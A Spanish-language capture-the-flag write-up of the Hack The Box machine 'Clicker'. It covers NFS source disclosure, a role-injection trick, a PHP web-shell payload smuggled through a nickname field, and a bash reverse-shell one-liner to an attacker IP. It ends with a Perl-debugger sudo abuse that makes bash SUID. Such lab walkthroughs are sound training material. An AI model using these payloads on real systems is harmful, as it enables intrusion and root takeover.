---
layout: single
title: Clicker - Hack The Box
excerpt: "Para resolver esta máquina, nos aprovechamos de qué tenemos un backup del código fuente por NFS, para convertirnos en administradores de la página web, obteniendo así un nuevo panel, en el cual podemos exportar los mejores jugadores en formatos específicos, pero lograremos exportarlo en un formato del cual nos podamos aprovechar para llevar a cabo un RFI, obteniendo así una Reverse Shell, posterior aprovecharnos de una clave privada de SHH para conectarnos como un usuario no privilegiado, y finalmente abusar de un script qué podemos ejecutar como ROOT para convertirnos en el mismo. "
date: 2023-11-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-clicker/clicker_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - exposed source code
  - burpsuite
  - mass asignment attack
  - RFI
  - LFI
  - ssh rsa auth
  - abusing sudoers
  - abusing SUID
---

![](/assets/images/htb-writeup-clicker/clicker_logo.png)


# PortScan

``` bash
nmap -sCV -p22,80,111,2049,37769,44149,48451,54735,56581 10.10.11.232
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 12:53 AST
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.062s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Clicker - The Game
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40807/tcp6  mountd
|   100005  1,2,3      42441/udp6  mountd
|   100005  1,2,3      51673/udp   mountd
|   100005  1,2,3      54735/tcp   mountd
|   100021  1,3,4      33115/tcp6  nlockmgr
|   100021  1,3,4      37641/udp6  nlockmgr
|   100021  1,3,4      37769/tcp   nlockmgr
|   100021  1,3,4      48934/udp   nlockmgr
|   100024  1          33911/tcp6  status
|   100024  1          36848/udp6  status
|   100024  1          37748/udp   status
|   100024  1          44149/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
37769/tcp open  nlockmgr 1-4 (RPC #100021)
44149/tcp open  status   1 (RPC #100024)
48451/tcp open  mountd   1-3 (RPC #100005)
54735/tcp open  mountd   1-3 (RPC #100005)
56581/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds

```



# Obteniendo recursos compartidos NFS :2049

En el puerto **:2049** como vemos en el escaneo, tenemos un recurso compartido **NFS**, el cual posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.

Por ende, podríamos aprovecharnos de esto para ver qué archivos/ficheros están en este NFS.

```bash
mkdir -p /mnt/
mount -o nolock 10.10.11.232:/ /mnt/
```

Esto nos montará todo los ficheros/archivos del **NFS** de la máquina víctima en un directorio **"/mnt/"** que estará en la raíz de nuestra máquina local2

![](/assets/images/htb-writeup-clicker/Pasted image 20231104130546.png)

Cuando lo tengamos en local, tendremos un **.ZIP**, el cual debemos descomprimir, pero de primera **NO** nos dejará porqué sólo tiene permiso de lectura, para ello debemos copiárnoslo en otra ruta distinta a la de "**/mnt/**." y ya nos dejaría descomprimirlo.
```bash
cp /mnt/mnt/backups/clicker.htb_backup.zip .
```

![](/assets/images/htb-writeup-clicker/Pasted image 20231104131807.png)

Esto nos pondrá el .ZIP en el directorio actual de trabajo, y tan sólo quedaría descomprimirlo.

```bash
unzip clicker.htb_backup.zip
```


Una vez descomprimido, tendríamos lo qué a primera parecería un código fuente de un sitio web.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104131920.png)

En caso de qué encontremos operativo el sitio web con este código fuente, podremos aprovecharnos de lo qué parece una copia de seguridad para buscar vulnerabilidades del mismo.

# Sitio Web

![](/assets/images/htb-writeup-clicker/Pasted image 20231104125415.png)

A primera vista sólo tenemos 3 opciones en el panel, intenté loguearme con usuarios predeterminados para ver sí tenían credenciales default, pero no, en Info no vemos nada interesante, sin embargo, sí analizamos las opciones veremos que coinciden con el código fuente qué encontramos por **NFS**, por lo qué procedemos a registrarnos, para posterior iniciar sesión.


Una vez iniciada sesión, veremos un nuevo apartado qué dice "**Play**"

![](/assets/images/htb-writeup-clicker/Pasted image 20231104125606.png)


![](/assets/images/htb-writeup-clicker/Pasted image 20231104125631.png)

El cual podemos jugar dando click's y también dependiendo los click's ir subiendo de nivel.


# Detección vulnerabilidades con BurpSuite

Sí ahora con **Burpsuite**, interceptamos la petición de "**Save and close**" en la opción donde juegamos dando click, vemos esto:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104133250.png)

Vemos que está usando el recurso "**save_game.php**" para guardar los niveles & click qué tengamos en este momento, y sí analizamos este código fuente.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104133533.png)

Vemos que está haciendo una comparativa a ver sí a nivel de petición colocamos algún campo con nombre "**role**", por lo que nos da una pista de qué cada usuario tiene su **ROL**, por ende habrá algún rol con privilegios, y indagamos más en los códigos fuentes, hasta encontrarnos esto en "export.php"

![](/assets/images/htb-writeup-clicker/Pasted image 20231104133744.png)

Vemos que existe un rol qué es "**Admin**", por lo qué de primera se me ocurre setearlo en la petición con Burp, tal que así:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104133958.png)

Qué como respuesta obtendríamos esto:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104134102.png)

sabiendo como aplica la comparativa el código fuente, y que no está bien sanitizado, podríamos tratar de meter un salto de línea para qué sólo se quede "**role**" y a nivel de código no lea lo demás, tal que así:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104134417.png)

![](/assets/images/htb-writeup-clicker/Pasted image 20231104134444.png)

Como vemos ha funcionado, pero sí recargamos la página de primera no veríamos nada, pero sí salimos de la sesión para volver a entrar veríamos una nueva opción en el panel.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104134746.png)

Al darle a la opción de "**Administration**", vemos que podemos exportar en formato JSON, HTML & TXT, las stats de los mejores jugadores.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104134912.png)


Qué al darle a exportar, no las guardará con su respectiva extensión en el directorio "/exports/"

![](/assets/images/htb-writeup-clicker/Pasted image 20231104135020.png)

![](/assets/images/htb-writeup-clicker/Pasted image 20231104135154.png)

Interceptamos la petición cuando exportamos con BurpSuite para ver como viaja.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104135313.png)

Al ver esto, lo primero qué se me ocurre es modificar el txt por .php y ver sí logro exportarlo así.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104135354.png)

Y hemos logrado expórtalo perfectamente con el **.php**

De primera se me ocurre llevar a cabo un **RCE** tratando de cargar una instrucción maliciosa en unos de los campos **click** o **level** a la hora de guardar, pero no me funcionó, indagando más en el código fuente, encontré en **"authenticate.php"** qué existe un campo llamado "nickname"

![](/assets/images/htb-writeup-clicker/Pasted image 20231104135912.png)

Qué de primera a la hora de guardar no nos aparecería, pero forzaremos a que esté con un código malicioso PHP, tal que así:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104140400.png)
```
&nickname=<%3fphp+system($_GET['cmd'])+%3f>
```

de forma qué, sí podemos guardar qué el campo "**nickname**" valga esto, a la hora de exportar los top's player en formato **.php**, se interpretará el código malicioso de **nickname**, de forma qué podemos controlar en la **URL** el comando que queramos ejecutar.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104140557.png)

Nos lo ha aceptado, por ende podríamos nuevamente tratar de exportar los topplayer's cambiando la extensión a **.PHP** y ver sí nos lo interpreta.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104141421.png)

No nos está saliendo la exportación clásica, por lo qué nos da a entender que está interpretando el **PHP**, ahora jugamos en la URL con:

```
?cmd=cmd_a_ejecutar
```

Para ejecutar comandos, como vemos:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104141618.png)

Hemos logrado hacer el RCE, por lo qué ahora podemos llevar a cabo un **Reverse Shell** con el one liner clásico, pero antes debemos estar en escucha en nuestra máquina local.

```bash
nc -nlvp 443
```

```bash
bash -c "bash -i >%26 /dev/tcp/ipatacante/PORT 0>%261"
```

![](/assets/images/htb-writeup-clicker/Pasted image 20231104142039.png)

Esto nos otorgará una **Reverse Shell** en nuestra máquina local, como vemos:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104142116.png)

Tan sólo deberíamos darle tratamiento a la TTY, y tendríamos una consola en la máquina víctima totalmente funcional, sí no sabes como realizar un tratamiento a la TTY, te recomiendo leer este [((CLICKEAR AQUÍ))](https://4uli.github.io/tratamiento-tty/)

__________

# Escalada de Privilegio #1 

Estamos como el usuario www-data qué es el que corre el servicio WEB, pero nos interesa escalar privilegios, para ello conocemos los usuarios válidos del sistema.

```
cat /etc/passwd
```

![](/assets/images/htb-writeup-clicker/Pasted image 20231104142411.png)

Vemos qué existe un usuario **Jack**, indagando en el sistema en el directorio "**/opt/**" encontraríamos un binario el cual tenemos permiso para ejecutar, también un README el cual nos dice como ejecutarlo.

![[Pasted image 20231104142546.png]]

Ejecutándolo de la siguiente manera, vemos qué podemos leer archivos:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104142728.png)

Debido a que tiene permisos **SUID** y el propietario es **Jack**, podríamos aprovecharnos de esto para tratar de leer la clave privada.

```bash
/execute_query 5 ../.ssh/id_rsa
```

![](/assets/images/htb-writeup-clicker/Pasted image 20231104142943.png)

Como vemos hemos obtenido la clave privada, por lo qué procedemos a copiárnosla en local para meterla en un archivo, y conectarnos a través de SSH al usuario Jack.

Primero debemos darle permisos adecuado al archivo donde esté la clave, para posterior conectarnos:

```bash
chmod 600 id_rsa
ssh -i id_rsa jack@10.10.11.232
```

Nos dará error, esto porque la clave privada no está del todo correcta, y para arreglarla debemos asegurarnos que en "BEGIN OPENSSH" haya cinco guioneos tanto de la izquierda, como de la derecha, es decir, así:

![](/assets/images/htb-writeup-clicker/Pasted image 20231104153359.png)

Y debemos estar igual con 5 en la parte de abajo, una vez hagamos estos pequeños ajustes funcionará y podremos conectarnos, estando como Jack.
![](/assets/images/htb-writeup-clicker/Pasted image 20231104153447.png)

# Escalada de Privilegios #2

Ahora nos interesaría convertirnos en **Root**, y para ello empezamos una búsqueda de como podemos aprovecharnos para hacerlo.

En este caso, fijandonos en los permisos SUDOERS

![](/assets/images/htb-writeup-clicker/Pasted image 20231104153633.png)

Vemos que podemos ejecutar un script en Bash sin proporcionar ningún tipo de credencial, cuyo script dentro está compuesto por el siguiente código:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```


Que en el código vemos qué está usando un binario de la ruta "**/usr/bin/xml_pp"**, al examinarlo vemos qué está programado en Perl.

![](/assets/images/htb-writeup-clicker/Pasted image 20231104154412.png)

Por lo qué si indagamos un poco en internet de como poder explotar Perl para escalar nuestro privilegio a ROOT, encontraríamos el siguiente exploit[((Aquí))](https://www.exploit-db.com/exploits/39702) del cual nos aprovecharemos para tomar lo de dentro cmd_exec, y controlar nosotros mismo el comando qué queramos ejecutar, en este caso usaremos este:

```bash
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
```

Qué básicamente le dará permisos **SUID** a la Bash de ROOT, aprovechándonos que el script **Monitor.sh** podemos ejecutarlo como ROOT, lo ejecutamos para básicamente ejecutar el código malicioso de PERL.

Una vez hecho esto, ya podemos obtener una consola como ROOT, tan sólo haciendo esto:

```bash
bash -p
```

![](/assets/images/htb-writeup-clicker/Pasted image 20231104155135.png])

